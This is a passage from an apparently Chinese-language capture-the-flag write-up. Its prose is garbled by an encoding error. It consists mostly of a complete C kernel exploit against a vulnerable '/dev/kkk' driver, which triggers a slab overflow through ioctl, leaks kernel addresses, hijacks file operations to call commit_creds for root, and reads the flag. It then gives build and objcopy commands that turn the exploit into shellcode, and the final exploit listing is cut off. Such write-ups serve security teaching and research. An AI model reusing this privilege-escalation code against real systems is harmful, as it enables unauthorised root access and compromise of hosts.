</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;asm/unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">struct</span> <span class="n">AddParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">type</span><span class="p">;</span> <span class="c1">// type and enc
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>   
<span class="p">};</span>

<span class="k">struct</span> <span class="n">OtherParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>     
<span class="p">};</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_ioctl</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_ioctl</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_write</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_write</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_read</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_read</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_open</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mode</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_open</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">mode</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Add</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">AddParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B64</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>    
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6B</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Update</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B67</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Dump</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B69</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>    
<span class="p">}</span>

<span class="k">static</span> <span class="kr">__inline</span> <span class="nf">my_memset</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">){</span>
    <span class="k">while</span><span class="p">(</span><span class="n">len</span><span class="o">--</span><span class="p">)</span>
        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/dev/kkk&#34;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">sendbuf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">recvbuf</span><span class="p">[</span><span class="mh">0x10000</span><span class="p">];</span>
    
    <span class="c1">// printf(&#34;[+] Current UID: %d\n&#34;, getuid());
</span><span class="c1"></span>    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">__asm_my_open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// if(fd == -1){
</span><span class="c1"></span>    <span class="c1">//     puts(&#34;[-] open wrong, exit&#34;);
</span><span class="c1"></span>    <span class="c1">//     exit(0);
</span><span class="c1"></span>    <span class="c1">// }
</span><span class="c1"></span>
    <span class="k">struct</span> <span class="n">AddParam</span> <span class="n">a</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">OtherParam</span> <span class="n">r</span><span class="p">;</span>

    <span class="c1">// malloc 1024 - 48 = 0x3D0
</span><span class="c1"></span>
    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x7a</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x16</span><span class="p">;</span>  <span class="c1">// overflow 2 bits of the key size
</span><span class="c1"></span>    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>


    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// trigger overflow
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">sendbuf</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">recvbuf</span><span class="p">;</span>
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>   <span class="c1">// chunk 1 OOB read, read chunk 2
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">slub_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">);</span>  <span class="c1">// 0xffff888005318b70
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">kkk_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">);</span>   <span class="c1">// 0xffffffffc0000130
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kkk_fops</span> <span class="o">=</span> <span class="mh">0xffffffffc0001180ul</span> <span class="o">+</span> <span class="n">kkk_addr</span> <span class="o">-</span> <span class="mh">0xffffffffc0000130ul</span><span class="p">;</span>

    <span class="c1">// printf(&#34;[+] slub_addr: 0x%lx\n&#34;, slub_addr);
</span><span class="c1"></span>    <span class="c1">// printf(&#34;[+] kkk_addr: 0x%lx\n&#34;, kkk_addr);
</span><span class="c1"></span>    <span class="c1">// printf(&#34;[+] kkk_fops: 0x%lx\n&#34;, kkk_fops);
</span><span class="c1"></span>

    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>   <span class="c1">// key_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">)</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>   <span class="c1">// key_buf
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x50</span><span class="p">;</span>   <span class="c1">// data_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">)</span> <span class="o">=</span> <span class="n">kkk_fops</span><span class="p">;</span>   <span class="c1">// data_buf    
</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// chunk 1 OOB write, write chunk 2 
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>   
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span> <span class="c1">// dump chunk 2 to leak kkk_fops
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kernel_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">sendbuf</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">);</span> <span class="c1">// 0xffffffff812258e0
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">kernel_addr</span> <span class="o">-</span> <span class="mh">0xffffffff812258e0</span> <span class="o">+</span> <span class="mh">0xffffffff8109bcf0</span><span class="p">;</span>
    <span class="c1">// printf(&#34;[+] kernel_addr: 0x%lx\n&#34;, kernel_addr);
</span><span class="c1"></span>    <span class="c1">// printf(&#34;[+] commit_creds: 0x%lx\n&#34;, commit_creds);
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">my_memset</span><span class="p">(</span><span class="n">recvbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>
    <span class="c1">// ptr[16] = 0xffffffff8284ef80;
</span><span class="c1"></span>    <span class="c1">// ptr[17] = 0xffffffff8284f020;
</span><span class="c1"></span>    <span class="n">ptr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0xffffffff8109bcf0</span> <span class="o">+</span> <span class="mh">0xffffffff8284f020</span><span class="p">;</span>
    <span class="c1">// ptr[18] = 0xffffffff82850e20;
</span><span class="c1"></span>    <span class="c1">// ptr[19] = 0xffffffff82850610;
</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>

    <span class="c1">// getchar();
</span><span class="c1"></span>    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>    <span class="c1">// trigger encryption, get root.
</span><span class="c1"></span>
    <span class="c1">// printf(&#34;[+] Current UID: %d\n&#34;, getuid());
</span><span class="c1"></span>    <span class="c1">// if (getuid()==0){
</span><span class="c1"></span>        <span class="c1">// printf(&#34;[+] Root now!!!\n&#34;);
</span><span class="c1"></span>        <span class="c1">// getchar();
</span><span class="c1"></span>    <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/flag&#34;</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">tmpfd</span> <span class="o">=</span> <span class="n">__asm_my_open</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
        <span class="c1">// if(tmpfd&lt;0){
</span><span class="c1"></span>        <span class="c1">//     printf(&#34;[-] Open error...&#34;);
</span><span class="c1"></span>        <span class="c1">//     exit(0);
</span><span class="c1"></span>        <span class="c1">// }
</span><span class="c1"></span>    <span class="n">__asm_my_read</span><span class="p">(</span><span class="n">tmpfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
    <span class="n">__asm_my_write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
    <span class="c1">// }
</span><span class="c1"></span>
    <span class="c1">// while(1);
</span><span class="c1"></span>
    <span class="c1">// system(&#34;/bin/sh&#34;);
</span><span class="c1"></span>    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="step-3">step 3</h2>
<p>æœ€åä¸€æ­¥ï¼Œæˆ‘ä»¬å°†ä¸¤ä¸ª exp åˆèµ·æ¥ã€‚é¦–å…ˆæ‹¿åˆ° exloit.c çš„ shellcodeï¼Œå¦‚æœç¡®å®éƒ½æ”¹æˆ inline æ±‡ç¼–çš„è¯ï¼Œç›´æ¥è¿™æ ·ç¼–è¯‘å°±è¡Œã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">gcc exploit.c -o exploit -pie -O2 -fno-stack-protector
</code></pre></td></tr></table>
</div>
</div><p>æå–å‡ºä»£ç æ®µï¼Œäºæ˜¯ä¾¿å¾—åˆ°äº†çº¯æœºå™¨ç çš„åˆ©ç”¨è„šæœ¬ã€‚åœ¨æ‰“ç©¿ parser çš„è„šæœ¬ä¸­è¯»å…¥è¿™æ®µ shellcode å³å¯å®Œæˆåˆ©ç”¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">objcopy -O binary --only-section=.text exploit exp.o
</code></pre></td></tr></table>
</div>
</div><p>æœ€åéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œshellcode ä¸èƒ½ç›´æ¥ <code>read</code> è¿›æ¥ï¼Œéœ€è¦åˆ©ç”¨ parser é‡Œçš„ <code>read_through_base64</code> å‡½æ•°è¯» base64 è¿›å»ã€‚</p>
<blockquote>
<p>ç›´æ¥å‘äº†ä¸å¯è§å­—ç¬¦ç»™ qemu ä¼šè¢«åå­—èŠ‚çš„ï¼Œå› ä¸ºç›¸å½“äºå‘ä¿¡å·è¿‡å»äº†ã€‚</p>
</blockquote>
<p>æœ€ç»ˆ exp å¦‚ä¸‹ï¼Œä»¥ä¸å°çš„æ¦‚ç‡æ‰“é€šã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
